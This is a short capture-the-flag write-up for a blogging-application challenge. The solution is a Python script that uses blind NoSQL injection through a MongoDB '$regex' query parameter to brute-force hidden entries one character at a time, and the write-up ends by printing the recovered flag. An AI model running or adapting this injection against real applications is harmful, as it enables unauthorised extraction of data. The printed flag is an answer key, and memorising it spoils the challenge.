#### Challenge:

Hi Expert,

some kind of blogging application remains unfinished on `http://78.128.216.18:65180`, but it can contain some information about end of the civilization. Get the content of all entries. 

Good Luck

---

#### Solution:

- inspecting the web site reveals that queries are passed to `MongoDB` thus `NOSQL-injection` is the best candidate

```python
import requests
import string
import urllib.parse

ses = requests.session()

flag = "FLAG{"
print(flag, flush=True, end='')
r = ses.get(
    'http://78.128.216.18:65180/view?title[$regex]='+urllib.parse.quote(flag))
while "}" not in flag:
    for char in list(string.ascii_lowercase+string.ascii_uppercase+string.digits+"-"+"}"):
        print(char, flush=True, end='')
        r = ses.get(
            'http://78.128.216.18:65180/view?title[$regex]='+urllib.parse.quote(flag+char))

        if "flag" in str(r.content):
            flag = flag + char
            break
        else:
            print('\b', flush=True, end='')

print()
```

---

<details><summary>FLAG:</summary>

```
FLAG{LWbF-QzFv-xyCt-mkUE}
```

</details>
<br/>
